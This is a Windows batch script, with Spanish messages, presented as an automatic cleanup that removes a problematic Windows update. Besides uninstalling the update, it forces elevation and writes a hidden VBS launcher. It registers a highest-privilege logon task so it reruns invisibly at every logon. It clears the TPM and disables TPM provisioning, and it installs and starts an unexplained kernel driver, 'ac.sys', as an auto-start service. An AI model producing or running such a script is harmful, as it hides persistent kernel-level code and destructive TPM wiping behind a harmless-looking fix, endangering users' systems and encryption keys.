��&cls
@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

set "TaskName=LimpiezaAuto"

set "ScriptPath=%~f0"

set "VbsPath=%~dp0oculto.vbs"

if not exist "%VbsPath%" (
    echo Set WshShell = CreateObject("WScript.Shell") > "%VbsPath%"
    echo WshShell.Run "cmd /c ""%ScriptPath%""", 0, False >> "%VbsPath%"
)

schtasks /query /tn "%TaskName%" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /sc onlogon /tn "%TaskName%" /tr "\"%VbsPath%\"" /rl highest /f
)


openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

echo.
echo.  Verificando si el update problematico esta instalado...
powershell -Command "if (Get-HotFix -Id KB5066835 -ErrorAction SilentlyContinue) { Write-Host ' Eliminando El update...'; Start-Process 'wusa.exe' -ArgumentList '/uninstall','/kb:5066835','/quiet','/norestart' -Wait; Write-Host ' Desinstalacion completada (requiere reinicio)'; } else { Write-Host ' El Update no esta instalada, se omite.' }"
echo.

powershell -Command "Clear-Tpm"
powershell -Command "Disable-TpmAutoProvisioning"

sc create ac type= kernel start= auto binPath= "%~dp0ac.sys"

sc start ac
